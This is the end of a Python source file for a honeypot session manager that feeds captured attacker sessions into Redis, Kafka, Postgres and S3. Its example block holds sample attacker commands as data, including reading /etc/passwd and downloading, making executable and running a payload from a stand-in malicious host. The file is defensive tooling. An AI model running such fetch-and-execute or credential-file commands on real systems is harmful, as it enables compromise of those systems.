    async def shutdown(self):
        """Graceful shutdown of the session manager."""
        logger.info("Shutting down AdversarySessionManager...")
        
        # Close Kafka producer
        if self.kafka_producer:
            await self.kafka_producer.stop()
        
        # Close database pool
        if self.db_pool:
            await self.db_pool.close()
        
        # Close Redis connection
        if self.redis_client:
            await self.redis_client.close()
        
        logger.info("AdversarySessionManager shutdown complete")

# Example usage and configuration
if __name__ == "__main__":
    
    # Configuration
    config = {
        'redis_host': 'localhost',
        'redis_port': 6379,
        'kafka_servers': 'localhost:9092',
        'database_url': 'postgresql://cerberus:password@localhost/cerberus',
        's3_bucket': 'cerberus-adversary-sessions',
        'retention_days': 30,
        'shodan_api_key': 'your_shodan_key_here'
    }
    
    async def main():
        """Main execution function."""
        
        # Initialize session manager
        session_manager = AdversarySessionManager(config)
        await session_manager.initialize()
        
        # Example: Process a raw honeypot session
        raw_session = {
            'honeypot_id': 'honey-ssh-01',
            'source_ip': '192.168.1.100',
            'protocol': 'SSH',
            'port': 22,
            'commands': [
                'whoami',
                'ls -la',
                'cat /etc/passwd',
                'wget http://malicious-site.com/payload.sh',
                'chmod +x payload.sh',
                './payload.sh'
            ],
            'files': ['/etc/passwd', '/var/log/auth.log'],
            'connections': [
                {'dest_ip': '10.0.0.1', 'dest_port': 80, 'protocol': 'HTTP'},
                {'dest_ip': '192.168.1.200', 'dest_port': 443, 'protocol': 'HTTPS'}
            ]
        }
        
        # Onboard the session (triggers full pipeline)
        session = await session_manager.onboard_session(raw_session)
        
        # Monitor processing
        await asyncio.sleep(30)  # Allow processing to complete
        
        # Get metrics
        metrics = await session_manager.get_metrics()
        print("System Metrics:", json.dumps(metrics, indent=2))
        
        # Health check
        health = await session_manager.health_check()
        print("Health Status:", json.dumps(health, indent=2))
        
        # Graceful shutdown
        await session_manager.shutdown()
    
    # Run the example
    asyncio.run(main())
